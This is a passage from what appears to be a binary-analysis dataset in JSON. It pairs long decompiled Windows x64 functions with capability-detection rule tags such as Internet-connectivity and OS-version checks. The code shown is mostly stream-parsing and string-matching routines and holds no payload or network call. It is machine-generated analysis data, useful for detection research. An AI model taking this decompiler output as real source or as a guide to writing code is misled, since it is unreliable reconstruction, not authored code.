!= iVar10) goto code_r0x000140061495;\n                                }\n                                uVar15 = auStack200[1];\n                                cVar6 = '\\x01';\n                                break;\n                            }\ncode_r0x000140061495:\n                            uVar19 = uVar19 + 1;\n                            uVar15 = auStack200[1];\n                            cVar6 = var_68h._5_1_;\n                        } while (uVar22 != uVar19);\n                    }\n                    else {\n                        cVar6 = '\\0';\n                    }\n                    puVar16 = var_78h;\n                    uVar19 = 0;\n                    do {\n                        if ((uVar21 == uVar15) == cVar6) {\n                            uVar22 = uVar22 - 1;\n                            iStack144 = uVar22 * 8;\n                            puVar1[uVar19] = puVar1[uVar22];\n                            var_78h[uVar19] = var_78h[uVar22];\n                            if (uVar22 <= uVar19) goto code_r0x0001400614f9;\n                        }\n                        else {\n                            uVar19 = uVar19 + 1;\n                            if (uVar22 <= uVar19) goto code_r0x0001400614f9;\n                        }\n                        uVar15 = var_78h[uVar19];\n                    } while( true );\n                }\n                if (uStack152 < uVar21) goto code_r0x0001400611f8;\n                goto code_r0x000140061086;\n            }\n            uStack152 = 0;\ncode_r0x000140061086:\n            piVar18 = var_50h_2;\n            if (uVar22 == 1) {\n                *(&stack0xffffffffffffff10 + iVar14) = 0x140061099;\n                fcn.1400960e0(piVar18);\n                var_48h._0_4_ = CONCAT22(var_48h._2_2_, 0xffff);\n                uVar21 = uStack152 + 1;\ncode_r0x0001400610aa:\n                uVar22 = *puVar1;\ncode_r0x0001400610ae:\n                var_70h = *var_78h;\n                var_78h = uVar22;\n                if (uVar21 < var_70h) {\n                    var_68h._6_2_ = var_68h._6_2_ & 0xff00 | var_58h == -1;\n                    piVar18 = var_50h_2;\n                    do {\n                        bVar23 = var_48h == -1;\n                        bVar4 = bVar23;\n                        if ((piVar18 != NULL) && (bVar23)) {\n                            if (piVar18[2] < piVar18[3]) {\n                                iVar10 = *piVar18[2];\n                            }\n                            else {\n                                pcVar2 = *(*piVar18 + 0x48);\n                                *(&stack0xffffffffffffff10 + iVar14) = 0x1400616d2;\n                                iVar10 = (*pcVar2)(piVar18);\n                            }\n                            if (iVar10 == -1) {\n                                var_50h_2 = NULL;\n                            }\n                            bVar4 = iVar10 == -1;\n                        }\n                        if ((var_60h != NULL) && (var_68h._6_1_ != '\\0')) {\n                            if (var_60h[2] < var_60h[3]) {\n                                iVar10 = *var_60h[2];\n                            }\n                            else {\n                                pcVar2 = *(*var_60h + 0x48);\n                                *(&stack0xffffffffffffff10 + iVar14) = 0x1400616b3;\n                                iVar10 = (*pcVar2)();\n                            }\n                            if (iVar10 == -1) {\n                                var_60h = NULL;\n                            }\n                            var_68h._6_1_ = iVar10 == -1;\n                        }\n                        if (bVar4 == var_68h._6_1_) goto code_r0x000140061595;\n                        pcVar2 = *(*piVar13 + 0x40);\n                        *(&stack0xffffffffffffff10 + iVar14) = 0x140061121;\n                        iVar10 = (*pcVar2)(piVar13);\n                        piVar18 = var_50h_2;\n                        if ((var_50h_2 != NULL) && (bVar23)) {\n                            if (var_50h_2[2] < var_50h_2[3]) {\n                                iVar11 = *var_50h_2[2];\n                            }\n                            else {\n                                pcVar2 = *(*var_50h_2 + 0x48);\n                                *(&stack0xffffffffffffff10 + iVar14) = 0x1400616c1;\n                                iVar11 = (*pcVar2)(piVar18);\n                            }\n                            if (iVar11 == -1) {\n                                var_50h_2 = NULL;\n                                piVar18 = NULL;\n                            }\n                        }\n                        pcVar2 = *(*piVar13 + 0x40);\n                        *(&stack0xffffffffffffff10 + iVar14) = 0x140061142;\n                        iVar11 = (*pcVar2)(piVar13);\n                        if (iVar11 != iVar10) {\n                            pcVar2 = *(*piVar13 + 0x30);\n                            *(&stack0xffffffffffffff10 + iVar14) = 0x140061156;\n                            iVar10 = (*pcVar2)(piVar13);\n                            if ((piVar18 != NULL) && (bVar23)) {\n                                if (piVar18[2] < piVar18[3]) {\n                                    iVar11 = *piVar18[2];\n                                }\n                                else {\n                                    pcVar2 = *(*piVar18 + 0x48);\n                                    *(&stack0xffffffffffffff10 + iVar14) = 0x1400616e0;\n                                    iVar11 = (*pcVar2)(piVar18);\n                                }\n                                if (iVar11 == -1) {\n                                    var_50h_2 = NULL;\n                                }\n                            }\n                            pcVar2 = *(*piVar13 + 0x30);\n                            *(&stack0xffffffffffffff10 + iVar14) = 0x140061173;\n                            iVar11 = (*pcVar2)(piVar13);\n                            piVar18 = var_50h_2;\n                            if (iVar11 != iVar10) goto code_r0x000140061595;\n                        }\n                        if (piVar18[2] < piVar18[3]) {\n                            piVar18[2] = piVar18[2] + 2;\n                        }\n                        else {\n                            pcVar2 = *(*piVar18 + 0x50);\n                            *(&stack0xffffffffffffff10 + iVar14) = 0x140061644;\n                            (*pcVar2)(piVar18);\n                        }\n                        uVar21 = uVar21 + 1;\n                        var_48h._0_2_ = -1;\n                        var_48h._0_4_ = CONCAT22(var_48h._2_2_, 0xffff);\n                    } while (var_70h != uVar21);\n                    uVar20 = SUB84(var_78h, 0);\n                }\n                else {\ncode_r0x000140061595:\n                    uVar20 = SUB84(var_78h, 0);\n                    if (var_70h != uVar21) goto code_r0x000140060efe;\n                }\n                *noname_4 = uVar20;\n                goto code_r0x000140060f08;\n            }\n        }\n    }\ncode_r0x000140060efe:\n    *var_50h = *var_50h | 4;\ncode_r0x000140060f08:\n    *arg1 = var_50h_2._0_4_;\n    arg1[1] = var_50h_2._4_4_;\n    arg1[2] = var_48h;\n    arg1[3] = var_48h._4_4_;\n    return;\ncode_r0x0001400614f9:\n    if (cVar6 == '\\0') {\n        if (uVar22 != 2) {\n            if (uVar22 != 1) goto code_r0x000140060efe;\n            goto code_r0x0001400610aa;\n        }\n        if ((uStack176 & 1) != 0) goto code_r0x000140060efe;\n        uVar22 = *puVar1;\n        uVar15 = uStack176 >> 1;\n        if (uVar22 < uVar15) {\n            if (uVar15 + uVar22 == puVar1[1]) goto code_r0x0001400610ae;\n            goto code_r0x000140060efe;\n        }\n        if (uVar22 - uVar15 != puVar1[1]) goto code_r0x000140060efe;\n        *puVar1 = uVar22 - uVar15;\n        *puVar16 = puVar16[1];\n        uVar22 = *puVar1;\n        goto code_r0x0001400610ae;\n    }\n    uVar15 = *var_78h;\n    if (1 < uVar22) {\n        puVar16 = puStack160;\n        do {\n            if (*puVar16 < uVar15) {\n                uVar15 = *puVar16;\n            }\n            puVar16 = puVar16 + 1;\n        } while (var_78h + iStack144 != puVar16);\n    }\n    if (uVar15 <= uVar21) goto code_r0x000140061086;\n    uVar12 = var_48h & 0xffff;\n    bVar23 = var_48h == -1;\n    bVar4 = bVar23;\n    if ((var_50h_2 != NULL) && (piVar18 = var_50h_2,  bVar23)) {\ncode_r0x0001400611f8:\n        if (piVar18[2] < piVar18[3]) {\n            iVar10 = *piVar18[2];\n        }\n        else {\n            pcVar2 = *(*piVar18 + 0x48);\n            *(&stack0xffffffffffffff10 + iVar14) = 0x14006167e;\n            iVar10 = (*pcVar2)(piVar18);\n        }\n        if (iVar10 == -1) {\n            var_50h_2 = NULL;\n        }\n        bVar23 = iVar10 == -1;\n        uVar12 = 0xffffffff;\n        bVar4 = true;\n    }\n    bVar24 = var_58h == -1;\n    if ((var_60h != NULL) && (bVar24)) {\n        if (var_60h[2] < var_60h[3]) {\n            iVar10 = *var_60h[2];\n        }\n        else {\n            pcVar2 = *(*var_60h + 0x48);\n            *(&stack0xffffffffffffff10 + iVar14) = 0x140061670;\n            iVar10 = (*pcVar2)();\n        }\n        if (iVar10 == -1) {\n            var_60h = NULL;\n        }\n        bVar24 = iVar10 == -1;\n    }\n    piVar18 = var_50h_2;\n    if (bVar23 == bVar24) goto code_r0x000140061086;\n    if ((var_50h_2 == NULL) || (!bVar4)) {\n        uVar17 = uVar12 & 0xffff;\n    }\n    else {\n        if (var_50h_2[2] < var_50h_2[3]) {\n            uVar9 = *var_50h_2[2];\n        }\n        else {\n            pcVar2 = *(*var_50h_2 + 0x48);\n            *(&stack0xffffffffffffff10 + iVar14) = 0x140061662;\n            uVar9 = (*pcVar2)(piVar18);\n        }\n        uVar17 = uVar9;\n        if (uVar9 != 0xffff) {\n            pcVar2 = *(*piVar13 + 0x40);\n            *(&stack0xffffffffffffff10 + iVar14) = 0x140061394;\n            var_68h._6_2_ = (*pcVar2)(piVar13);\n            if (piVar18[2] < piVar18[3]) {\n                uVar12 = *piVar18[2];\n            }\n            else {\n                pcVar2 = *(*piVar18 + 0x48);\n                *(&stack0xffffffffffffff10 + iVar14) = 0x140061652;\n                uVar12 = (*pcVar2)(piVar18);\n            }\n            if (uVar12 == -1) {\n                var_50h_2 = NULL;\n            }\n            goto code_r0x000140061276;\n        }\n        var_50h_2 = NULL;\n    }\n    pcVar2 = *(*piVar13 + 0x40);\n    *(&stack0xffffffffffffff10 + iVar14) = 0x140061272;\n    var_68h._6_2_ = (*pcVar2)(piVar13, uVar17);\ncode_r0x000140061276:\n    pcVar2 = *(*piVar13 + 0x30);\n    *(&stack0xffffffffffffff10 + iVar14) = 0x140061282;\n    uVar9 = (*pcVar2)(piVar13, uVar12 & 0xffff);\n    if (uVar22 == 0) goto code_r0x000140060efe;\n    puStack136 = puStack136 & 0xffffffffffff0000 | uVar9;\n    uVar15 = 0;\n    var_70h = uStack152 * 2;\n    do {\n        while( true ) {\n            uVar8 = *(var_70h + *(noname_5 + puVar1[uVar15] * 8));\n            pcVar2 = *(*piVar13 + 0x40);\n            *(&stack0xffffffffffffff10 + iVar14) = 0x140061313;\n            uVar9 = (*pcVar2)(piVar13, uVar8);\n            if (var_68h._6_2_ != uVar9) break;\ncode_r0x000140061319:\n            uVar15 = uVar15 + 1;\n            if (uVar22 <= uVar15) goto code_r0x000140061322;\n        }\n        pcVar2 = *(*piVar13 + 0x30);\n        *(&stack0xffffffffffffff10 + iVar14) = 0x1400612bc;\n        iVar10 = (*pcVar2)(piVar13);\n        if (puStack136 == iVar10) goto code_r0x000140061319;\n        uVar22 = uVar22 - 1;\n        iStack144 = uVar22 * 8;\n        puVar1[uVar15] = puVar1[uVar22];\n        var_78h[uVar15] = var_78h[uVar22];\n    } while (uVar15 < uVar22);\ncode_r0x000140061322:\n    if (uVar22 < 2) goto code_r0x000140061086;\n    uVar15 = *var_78h;\n    goto code_r0x000140061020;\n}\n",
        "token_count": 5778
    },
    "14006399": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140063990(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4, int32_t *noname_4, int64_t noname_5, \n                  int64_t noname_6, int64_t noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n                  ulong arg_70h, ulong arg_78h, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    ulong uVar4;\n    bool bVar5;\n    int16_t iVar6;\n    uint16_t uVar7;\n    int16_t iVar8;\n    int64_t *piVar9;\n    int64_t iVar10;\n    int64_t *piVar11;\n    uint8_t uVar12;\n    bool bVar13;\n    uint64_t uVar14;\n    uchar *puVar15;\n    bool bVar16;\n    uint64_t uVar17;\n    int64_t iVar18;\n    uint64_t *puVar19;\n    uint64_t uVar20;\n    int64_t *piVar21;\n    int64_t *piVar22;\n    int64_t *piVar23;\n    int64_t *arg1_00;\n    uint16_t uVar24;\n    uint64_t uVar25;\n    ulong var_8h_2;\n    int32_t iVar26;\n    uint32_t *var_bp_50h;\n    ulong uStack160;\n    uchar auStack152 [32];\n    ulong uStack120;\n    int64_t *piStack112;\n    int64_t *piStack104;\n    int64_t *piStack96;\n    int64_t *piStack88;\n    int64_t *piStack80;\n    ulong var_28h;\n    ulong var_bp_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    piVar11 = arg3[1];\n    piStack88 = *arg4;\n    piVar22 = arg4[1];\n    arg1_00 = *arg3;\n    uVar25 = piVar11 & 0xffffffff;\n    noname_7 = noname_7 + 0xd0;\n    uStack160 = 0x1400639dd;\n    piStack96 = piVar11;\n    piStack80 = piStack88;\n    piVar9 = fcn.1400b3700(noname_7);\n    uStack160 = 0x1400639f8;\n    iVar10 = fcn.14000e880(noname_7);\n    piVar23 = piStack96;\n    iVar10 = -iVar10;\n    puVar15 = &stack0xffffffffffffff68 + iVar10;\n    piStack88._0_1_ = piStack96 == -1;\n    piVar1 = &stack0xffffffffffffff88 + iVar10;\n    bVar16 = arg1_00 != NULL && piStack88;\n    piVar21 = piStack80;\n    bVar5 = bVar16;\n    if (bVar16) {\n        if (arg1_00[2] < arg1_00[3]) {\n            iVar8 = *arg1_00[2];\n        }\n        else {\n            piStack96 = piStack80;\n            piStack80 = piVar23;\n            pcVar3 = *(*arg1_00 + 0x48);\n            *(&stack0xffffffffffffff60 + iVar10) = 0x140063e8f;\n            iVar8 = (*pcVar3)(arg1_00);\n            piVar21 = piStack96;\n            piVar23 = piStack80;\n        }\n        piStack88._0_1_ = false;\n        if (iVar8 == -1) {\n            arg1_00 = NULL;\n            bVar5 = false;\n            piStack88._0_1_ = bVar16;\n        }\n    }\n    piStack96._0_1_ = piVar22 == -1;\n    bVar13 = piVar21 != NULL && piStack96;\n    bVar16 = piStack96;\n    if (bVar13) {\n        if (piVar21[2] < piVar21[3]) {\n            iVar8 = *piVar21[2];\n        }\n        else {\n            piStack104 = piVar23;\n            piStack96 = piStack96 & 0xffffffffffffff00 | piStack96;\n            piStack88 = piStack88 & 0xffffffffffffff00 | piStack88;\n            piStack80 = piVar21;\n            pcVar3 = *(*piVar21 + 0x48);\n            *(&stack0xffffffffffffff60 + iVar10) = 0x140063eb4;\n            iVar8 = (*pcVar3)(piVar21);\n            piVar21 = piStack80;\n            piVar23 = piStack104;\n        }\n        piStack88 = NULL;\n        if (iVar8 != -1) {\n            piStack88 = piVar21;\n        }\n        bVar16 = iVar8 == -1 && bVar13;\n    }\n    piStack96 = piVar23;\n    piVar22 = piStack96;\n    if (piStack88 != bVar16) {\n        iVar8 = uVar25;\n        if (bVar5) {\n            if (arg1_00[2] < arg1_00[3]) {\n                iVar8 = *arg1_00[2];\n            }\n            else {\n                piStack80 = piStack80 & 0xffffffffffffff00 | piStack96;\n                pcVar3 = *(*arg1_00 + 0x48);\n                *(&stack0xffffffffffffff60 + iVar10) = 0x140063edc;\n                iVar8 = (*pcVar3)(arg1_00);\n                piStack96._0_1_ = piStack80;\n            }\n            piVar22 = piStack96;\n            if (iVar8 == -1) {\n                arg1_00 = NULL;\n            }\n        }\n        noname_6 = noname_6 * 2;\n        if (noname_6 != 0) {\n            uVar14 = 0;\n            piStack80 = piStack80 & 0xffffffffffff0000 | piVar11 & 0xffff;\n            iVar18 = 0;\n            piStack96 = arg1_00;\n            piStack104 = piStack104 & 0xffffffffffffff00 | piStack96;\n            piStack112 = piVar22;\ncode_r0x000140063cd1:\n            do {\n                if (**(noname_5 + iVar18 * 8) != iVar8) {\n                    pcVar3 = *(*piVar9 + 0x30);\n                    *(&stack0xffffffffffffff60 + iVar10) = 0x140063cc2;\n                    iVar6 = (*pcVar3)(piVar9);\n                    if (iVar6 != iVar8) {\n                        iVar18 = iVar18 + 1;\n                        if (iVar18 == noname_6) break;\n                        goto code_r0x000140063cd1;\n                    }\n                }\n                piVar1[uVar14] = iVar18;\n                iVar18 = iVar18 + 1;\n                uVar14 = uVar14 + 1;\n            } while (iVar18 != noname_6);\n            arg1_00 = piStack96;\n            piVar11 = piStack104;\n            uVar25 = piStack80 & 0xffff;\n            piVar22 = piStack112;\n            piStack96._0_1_ = piStack104;\n            if (uVar14 != 0) {\n                piStack104 = piStack112;\n                piStack96 = piStack96 & 0xffffffffffffff00 | piVar11 & 0xff;\n                piStack80 = uVar14;\n                *(&stack0xffffffffffffff60 + iVar10) = 0x140063d21;\n                piVar11 = arg1_00;\n                fcn.1400960e0(arg1_00);\n                uVar25 = piStack80;\n                *(&stack0xffffffffffffff60 + iVar10) = 0x140063d36;\n                iVar18 = fcn.14000e880(piVar11);\n                uVar14 = 0;\n                iVar18 = -iVar18;\n                puVar15 = &stack0xffffffffffffff68 + iVar18 + iVar10;\n                piStack80 = piStack80 & 0xffffffffffffff00 | piStack96 & 0xff;\n                piStack96 = piStack104;\n                puVar19 = &stack0xffffffffffffff88 + iVar18 + iVar10;\n                do {\n                    uVar4 = *(noname_5 + piVar1[uVar14] * 8);\n                    *(&stack0xffffffffffffff60 + iVar18 + iVar10) = 0x140063d6d;\n                    uVar17 = sub.msvcrt.dll_wcslen(uVar4);\n                    puVar19[uVar14] = uVar17;\n                    uVar14 = uVar14 + 1;\n                } while (uVar25 != uVar14);\n                uVar25 = 0xffffffff;\n                uVar17 = 1;\n                piStack96._0_1_ = piStack80;\n                goto code_r0x000140063a48;\n            }\n        }\n    }\n    piStack96 = piVar22;\n    uVar14 = 0;\n    uVar17 = 0;\n    puVar19 = NULL;\ncode_r0x000140063a48:\n    do {\n        uVar24 = uVar25;\n        piStack104._0_1_ = uVar24 == 0xffff;\n        piStack80._0_1_ = arg1_00 != NULL && piStack104;\n        piStack112._0_1_ = piStack104;\n        if (piStack80) {\n            if (arg1_00[2] < arg1_00[3]) {\n                iVar8 = *arg1_00[2];\n            }\n            else {\n                piStack112 = piStack112 & 0xffffffffffffff00 | piStack96;\n                piStack104 = piStack104 & 0xffffffffffffff00 | piStack104;\n                piStack80 = piStack80 & 0xffffffffffffff00 | piStack80;\n                pcVar3 = *(*arg1_00 + 0x48);\n                *(puVar15 + -8) = 0x140063e4d;\n                iVar8 = (*pcVar3)(arg1_00);\n                piStack96._0_1_ = piStack112;\n            }\n            piStack112._0_1_ = piStack104;\n            if (iVar8 == -1) {\n                arg1_00 = NULL;\n                piStack104._0_1_ = piStack80;\n            }\n            else {\n                piStack104._0_1_ = 0;\n            }\n        }\n        uVar12 = piStack88 != NULL & piStack96;\n        if (uVar12 == 0) {\n            if (piStack104 == piStack96) break;\n        }\n        else {\n            if (piStack88[2] < piStack88[3]) {\n                iVar8 = *piStack88[2];\n                piStack80._0_1_ = piStack104;\n                piStack104._0_1_ = uVar12;\n            }\n            else {\n                uStack120._7_1_ = piStack96;\n                piStack112 = piStack112 & 0xffffffffffffff00 | piStack112;\n                piStack104 = piStack104 & 0xffffffffffffff00 | uVar12;\n                piStack80 = piStack80 & 0xffffffffffffff00 | piStack104;\n                pcVar3 = *(*piStack88 + 0x48);\n                *(puVar15 + -8) = 0x140063e1f;\n                iVar8 = (*pcVar3)();\n                piStack96._0_1_ = uStack120._7_1_;\n            }\n            if (iVar8 != -1) {\n                piStack104._0_1_ = 0;\n            }\n            piVar11 = NULL;\n            if (iVar8 != -1) {\n                piVar11 = piStack88;\n            }\n            piStack88 = piVar11;\n            if (piStack80 == piStack104) break;\n        }\n        uVar7 = uVar24;\n        if ((arg1_00 != NULL) && (piStack112 != 0)) {\n            if (arg1_00[2] < arg1_00[3]) {\n                uVar7 = *arg1_00[2];\n            }\n            else {\n                piStack80 = piStack80 & 0xffffffffffffff00 | piStack96;\n                pcVar3 = *(*arg1_00 + 0x48);\n                *(puVar15 + -8) = 0x140063df9;\n                uVar7 = (*pcVar3)(arg1_00);\n                piStack96._0_1_ = piStack80;\n            }\n            if (uVar7 == 0xffff) {\n                arg1_00 = NULL;\n            }\n        }\n        if (uVar14 == 0) goto code_r0x000140063c24;\n        piStack80 = piStack80 & 0xffffffffffff0000 | uVar25 & 0xffff;\n        uVar25 = 0;\n        uVar20 = 0;\ncode_r0x000140063ac5:\n        do {\n            if (uVar17 < puVar19[uVar25]) {\n                if (*(*(noname_5 + piVar1[uVar25] * 8) + uVar17 * 2) != uVar7) {\n                    uVar14 = uVar14 - 1;\n                    piVar1[uVar25] = piVar1[uVar14];\n                    puVar19[uVar25] = puVar19[uVar14];\n                    if (uVar14 <= uVar25) break;\n                    goto code_r0x000140063ac5;\n                }\n            }\n            else {\n                uVar20 = uVar20 + 1;\n            }\n            uVar25 = uVar25 + 1;\n        } while (uVar25 < uVar14);\n        uVar24 = piStack80;\n        if (uVar14 == uVar20) break;\n        if (arg1_00[2] < arg1_00[3]) {\n            arg1_00[2] = arg1_00[2] + 2;\n        }\n        else {\n            piStack80 = piStack80 & 0xffffffffffffff00 | piStack96;\n            pcVar3 = *(*arg1_00 + 0x50);\n            *(puVar15 + -8) = 0x140063c5e;\n            (*pcVar3)(arg1_00);\n            piStack96._0_1_ = piStack80;\n        }\n        uVar17 = uVar17 + 1;\n        uVar25 = 0xffffffff;\n    } while( true );\n    if (uVar14 == 1) {\n        uVar25 = *puVar19;\njoined_r0x000140063c6b:\n        if (uVar25 != uVar17) {\ncode_r0x000140063c24:\n            *var_bp_50h = *var_bp_50h | 4;\n            goto code_r0x000140063c2e;\n        }\n    }\n    else {\n        if (uVar14 != 2) goto code_r0x000140063c24;\n        if (*puVar19 != uVar17) {\n            uVar25 = puVar19[1];\n            goto joined_r0x000140063c6b;\n        }\n    }\n    iVar2 = *piVar1;\n    if (iVar26 <= iVar2) {\n        iVar2 = iVar2 - iVar26;\n    }\n    *noname_4 = iVar2;\ncode_r0x000140063c2e:\n    *arg1 = arg1_00;\n    arg1[1] = piStack96 & 0xffffffffffff0000 | uVar24;\n    return;\n}\n",
        "token_count": 3631
    },
    "14006577": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000140066383)\n// WARNING: Removing unreachable block (ram,0x000140065a54)\n// WARNING: Removing unreachable block (ram,0x000140065a5d)\n// WARNING: Removing unreachable block (ram,0x000140065a6a)\n// WARNING: Removing unreachable block (ram,0x000140066250)\n// WARNING: Removing unreachable block (ram,0x000140066666)\n// WARNING: Removing unreachable block (ram,0x00014006667b)\n// WARNING: Removing unreachable block (ram,0x000140065a73)\n// WARNING: Removing unreachable block (ram,0x000140065a7d)\n// WARNING: Removing unreachable block (ram,0x000140066310)\n// WARNING: Removing unreachable block (ram,0x00014006625e)\n// WARNING: Removing unreachable block (ram,0x00014006626b)\n// WARNING: Removing unreachable block (ram,0x000140065a93)\n// WARNING: Removing unreachable block (ram,0x000140065a9b)\n// WARNING: Removing unreachable block (ram,0x0001400659f4)\n// WARNING: Removing unreachable block (ram,0x0001400659ff)\n// WARNING: Removing unreachable block (ram,0x000140066000)\n// WARNING: Removing unreachable block (ram,0x000140065a03)\n// WARNING: Removing unreachable block (ram,0x000140065ab0)\n// WARNING: Removing unreachable block (ram,0x000140065ac1)\n// WARNING: Removing unreachable block (ram,0x000140065a20)\n// WARNING: Removing unreachable block (ram,0x000140065aca)\n// WARNING: Removing unreachable block (ram,0x000140065adb)\n// WARNING: Removing unreachable block (ram,0x000140065af1)\n// WARNING: Removing unreachable block (ram,0x000140065a23)\n// WARNING: Removing unreachable block (ram,0x000140065a3b)\n// WARNING: Removing unreachable block (ram,0x000140065a43)\n// WARNING: Removing unreachable block (ram,0x000140066210)\n// WARNING: Removing unreachable block (ram,0x00014006621e)\n// WARNING: Removing unreachable block (ram,0x000140066236)\n// WARNING: Removing unreachable block (ram,0x000140065a46)\n// WARNING: Removing unreachable block (ram,0x000140066330)\n// WARNING: Removing unreachable block (ram,0x00014006633e)\n// WARNING: Removing unreachable block (ram,0x0001400665e1)\n// WARNING: Removing unreachable block (ram,0x0001400666b2)\n// WARNING: Removing unreachable block (ram,0x0001400665f4)\n// WARNING: Removing unreachable block (ram,0x0001400665fd)\n// WARNING: Removing unreachable block (ram,0x0001400663b1)\n// WARNING: Removing unreachable block (ram,0x000140065de9)\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.140065770(uint *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    char cVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    uint64_t uVar6;\n    ulong *arg1_00;\n    int64_t iVar7;\n    ulong *in_R8;\n    uint64_t arg3;\n    ulong *in_R9;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong uStack136;\n    uint uStack128;\n    uint uStack124;\n    ulong uStack120;\n    uint uStack112;\n    uint uStack108;\n    uint uStack92;\n    int64_t iStack88;\n    int64_t aiStack80 [2];\n    \n    uStack120 = *in_R8;\n    uStack112 = *(in_R8 + 1);\n    uStack108 = *(in_R8 + 0xc);\n    uStack136 = *in_R9;\n    uStack128 = *(in_R9 + 1);\n    uStack124 = *(in_R9 + 0xc);\n    fcn.1400b36a0(in_stack_00000028 + 0xd0);\n    iVar4 = fcn.1400261c0(0x1400fb3f0);\n    piVar1 = *(*(in_stack_00000028 + 0xd0) + 0x18) + iVar4 * 8;\n    iVar7 = *piVar1;\n    if (iVar7 == 0) {\n        arg1_00 = fcn.1400b6520(0x70);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x14010b630;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x21) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x6f) = 0;\n        fcn.140099da0(arg1_00, in_stack_00000028 + 0xd0);\n        fcn.14009d930(*(in_stack_00000028 + 0xd0), arg1_00, iVar4);\n        iVar7 = *piVar1;\n    }\n    iStack88 = fcn.140075910(0, 0);\n    if (*(iVar7 + 0x20) != '\\0') {\n        fcn.140077810(&iStack88, 0x20);\n    }\n    aiStack80[0] = fcn.140075910(0, 0);\n    fcn.140077810(aiStack80, 0x20);\n    iVar4 = 0;\n    uStack92 = *(iVar7 + 0x60);\n    do {\n        if (*(&uStack92 + iVar4) < 5) {\n    // WARNING: Could not recover jumptable at 0x0001400658e5. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x1400fe710\n            puVar5 = (*(*(*(&uStack92 + iVar4) * 4 + 0x1400fe710) + 0x1400fe710))();\n            return puVar5;\n        }\n        iVar2 = iVar4;\n        iVar4 = iVar4 + 1;\n    } while (iVar2 + 1 < 4);\n    if ((1 < *(aiStack80[0] + -0x18)) && (uVar6 = fcn.14001ef10(aiStack80, 0x30, 0),  uVar6 != 0)) {\n        arg3 = *(aiStack80[0] + -0x18);\n        if (uVar6 == 0xffffffffffffffff) {\n            uVar6 = arg3 - 1;\n        }\n        if (uVar6 <= arg3) {\n            arg3 = uVar6;\n        }\n        fcn.140077920(aiStack80, 0, arg3, 0);\n    }\n    if (*(iStack88 + -0x18) != 0) {\n        fcn.140077ac0(&iStack88, 0);\n        cVar3 = fcn.1400b15c0(*(iVar7 + 0x10), *(iVar7 + 0x18), &iStack88);\n        if (cVar3 == '\\0') {\n            *in_stack_00000030 = *in_stack_00000030 | 4;\n        }\n    }\n    fcn.1400762a0(in_stack_00000038, aiStack80);\n    cVar3 = fcn.140023f10(&uStack120, &uStack136);\n    if (cVar3 != '\\0') {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = uStack120;\n    arg1[1] = uStack120._4_4_;\n    arg1[2] = uStack112;\n    arg1[3] = uStack108;\n    fcn.140075fa0(aiStack80[0] + -0x18);\n    fcn.140075fa0(iStack88 + -0x18);\n    return arg1;\n}\n",
        "token_count": 1982
    },
    "14006674": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000140067353)\n// WARNING: Removing unreachable block (ram,0x000140066a24)\n// WARNING: Removing unreachable block (ram,0x000140066a2d)\n// WARNING: Removing unreachable block (ram,0x000140066a3a)\n// WARNING: Removing unreachable block (ram,0x000140067220)\n// WARNING: Removing unreachable block (ram,0x000140067636)\n// WARNING: Removing unreachable block (ram,0x00014006764b)\n// WARNING: Removing unreachable block (ram,0x000140066a43)\n// WARNING: Removing unreachable block (ram,0x000140066a4d)\n// WARNING: Removing unreachable block (ram,0x0001400672e0)\n// WARNING: Removing unreachable block (ram,0x00014006722e)\n// WARNING: Removing unreachable block (ram,0x00014006723b)\n// WARNING: Removing unreachable block (ram,0x000140066a63)\n// WARNING: Removing unreachable block (ram,0x000140066a6b)\n// WARNING: Removing unreachable block (ram,0x0001400669c4)\n// WARNING: Removing unreachable block (ram,0x0001400669cf)\n// WARNING: Removing unreachable block (ram,0x000140066fd0)\n// WARNING: Removing unreachable block (ram,0x0001400669d3)\n// WARNING: Removing unreachable block (ram,0x000140066a80)\n// WARNING: Removing unreachable block (ram,0x000140066a91)\n// WARNING: Removing unreachable block (ram,0x0001400669f0)\n// WARNING: Removing unreachable block (ram,0x000140066a9a)\n// WARNING: Removing unreachable block (ram,0x000140066aab)\n// WARNING: Removing unreachable block (ram,0x000140066ac1)\n// WARNING: Removing unreachable block (ram,0x0001400669f3)\n// WARNING: 